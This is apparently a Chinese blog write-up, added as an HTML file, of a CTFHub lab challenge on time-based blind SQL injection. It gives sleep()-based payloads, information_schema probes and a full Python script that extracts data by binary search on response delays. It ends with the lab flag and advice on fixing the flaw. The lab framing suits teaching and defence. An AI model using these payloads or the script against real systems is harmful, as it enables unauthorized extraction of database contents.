@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 时间盲注 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; line-height: 1.6; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - SQL注入 - 时间盲注</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># SQL注入</span>
+            <span class="tag"># 时间盲注</span>
+            <span class="tag"># sleep()</span>
+            <span class="tag"># 二分法</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>时间盲注</li>
+            <li><strong>题目方向：</strong>Web - SQL注入</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>利用条件成立时的响应延迟逐字符提取 flag。</li>
+        </ul>
+
+        <h2>二、判断注入点</h2>
+        <p>页面提供 <code>id</code> 查询参数，提交 <code>id=1</code> 后会回显服务端执行的 SQL 语句，但不会返回查询结果：</p>
+        <pre>select * from news where id=1</pre>
+        <p>参数直接拼接在 <code>id=</code> 后，没有单引号包裹，属于整数型注入点。时间盲注无法通过页面内容判断真假，因此使用 MySQL 的 <code>if()</code> 与 <code>sleep()</code> 构造延迟：</p>
+        <pre>id=1 and if(1=1,sleep(2),0)
+id=1 and if(1=2,sleep(2),0)</pre>
+        <p>实测结果如下：</p>
+        <pre>baseline_ms=200
+true_payload_ms=2197
+false_payload_ms=201</pre>
+        <p>真条件请求约延迟 2 秒，假条件与基线基本一致，确认存在时间盲注。</p>
+
+        <h2>三、确认数据库结构</h2>
+        <p>使用 <code>information_schema.tables</code> 判断当前数据库中是否存在 <code>flag</code> 表：</p>
+        <pre>id=1 and if((
+  select count(*) from information_schema.tables
+  where table_schema=database() and table_name='flag'
+)&gt;0,sleep(1),0)</pre>
+        <p>请求出现约 1 秒延迟，说明目标表存在。继续判断 <code>flag</code> 表中是否存在同名字段：</p>
+        <pre>id=1 and if((
+  select count(*) from information_schema.columns
+  where table_schema=database()
+  and table_name='flag'
+  and column_name='flag'
+)&gt;0,sleep(1),0)</pre>
+        <p>该条件同样产生延迟，确认数据位于 <code>flag.flag</code>。实际提取时使用 <code>group_concat()</code>，可以把查询结果整理为单个字符串：</p>
+        <pre>select group_concat(flag) from flag</pre>
+
+        <h2>四、确定 Flag 长度</h2>
+        <p>通过 <code>length()</code> 判断结果长度。下面的条件成立时触发 <code>sleep(1)</code>：</p>
+        <pre>id=1 and if(length((
+  select group_concat(flag) from flag
+))=32,sleep(1),0)</pre>
+        <p>请求延迟约 1 秒，因此 flag 长度为 32 个字符。未知长度时，可以把相等判断改成大于判断，并在 <code>0</code> 到 <code>255</code> 之间二分。</p>
+
+        <h2>五、二分提取字符</h2>
+        <p>使用 <code>substr()</code> 截取指定位置的字符，再用 <code>ascii()</code> 转成 ASCII 码。将 ASCII 码与区间中点比较，根据是否延迟收缩范围：</p>
+        <pre>id=1 and if((
+  ascii(substr((
+    select group_concat(flag) from flag
+  ),position,1))
+)&gt;midpoint,sleep(1),0)</pre>
+        <p>例如判断第 1 个字符是否大于 ASCII 码 100：</p>
+        <pre>id=1 and if(ascii(substr((
+  select group_concat(flag) from flag
+),1,1))&gt;100,sleep(1),0)</pre>
+        <p>ASCII 可打印字符范围为 32 到 126，因此每个字符最多比较 7 次即可确定。</p>
+
+        <h2>六、自动化提取脚本</h2>
+        <p>由于网络抖动可能让错误请求偶然超过阈值，脚本使用 1 秒延迟，并对处于临界区间的请求自动重测。提取完成后，再用整串相等条件进行复核：</p>
+        <pre>import time
+import requests
+
+URL = "http://target/"
+DELAY = 1.0
+THRESHOLD = 0.65
+QUERY = "select group_concat(flag) from flag"
+
+session = requests.Session()
+session.trust_env = False
+
+def request_elapsed(condition):
+    payload = f"1 and if({condition},sleep({DELAY}),0)"
+    start = time.monotonic()
+    response = session.get(URL, params={"id": payload}, timeout=15)
+    response.raise_for_status()
+    return time.monotonic() - start
+
+def probe(condition):
+    samples = []
+    for _ in range(3):
+        elapsed = request_elapsed(condition)
+        if elapsed &gt;= THRESHOLD + 0.2:
+            return True
+        if elapsed &lt; THRESHOLD - 0.2:
+            return False
+        samples.append(elapsed &gt;= THRESHOLD)
+    return sum(samples) &gt;= 2
+
+def integer_gt(expression, midpoint):
+    return probe(f"({expression}) &gt; {midpoint}")
+
+def recover_length(query):
+    low, high = 0, 255
+    while low &lt; high:
+        mid = (low + high) // 2
+        if integer_gt(f"length(({query}))", mid):
+            low = mid + 1
+        else:
+            high = mid
+    return low
+
+def recover_char(query, position):
+    low, high = 0, 127
+    expression = f"ascii(substr(({query}),{position},1))"
+    while low &lt; high:
+        mid = (low + high) // 2
+        if integer_gt(expression, mid):
+            low = mid + 1
+        else:
+            high = mid
+    return chr(low)
+
+length = recover_length(QUERY)
+flag = "".join(recover_char(QUERY, i) for i in range(1, length + 1))
+
+assert probe(f"binary(({QUERY})) = binary '{flag}'")
+print(flag)</pre>
+        <p class="note">时间盲注的关键不是页面内容，而是响应时间。延迟过短容易受网络抖动影响，延迟过长则会显著增加提取耗时；本题使用 1 秒延迟可以兼顾稳定性与速度。</p>
+
+        <h2>七、提取与复核结果</h2>
+        <p>脚本在提取出完整字符串后，执行了整串相等条件复核，服务端再次产生约 1 秒延迟，确认结果正确：</p>
+        <pre>ctfhub{ea4825431d9cbcd9d35d735c}</pre>
+
+        <h2>八、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{ea4825431d9cbcd9d35d735c}
+        </div>
+
+        <h2>九、修复建议</h2>
+        <ul>
+            <li>使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。</li>
+            <li>对 <code>id</code> 等参数执行严格的数据类型和取值范围校验。</li>
+            <li>限制数据库账号权限，避免业务账号访问无关表和 <code>information_schema</code>。</li>
+            <li>设置合理的数据库与 Web 请求超时时间，降低时间侧信道的影响。</li>
+        </ul>
+
+        <h2>十、解题总结</h2>
+        <p>时间盲注适用于页面既没有查询结果，也没有明显真假响应差异的场景。本题使用 <code>if()</code> 和 <code>sleep()</code> 把 SQL 条件转换成响应时间，再通过 <code>length()</code>、<code>substr()</code> 与 <code>ascii()</code> 逐字符二分提取 flag。最终结果经过整串相等条件复核，有效排除了网络抖动造成的单字符误判。</p>
+    </div>
+</body>
+</html>
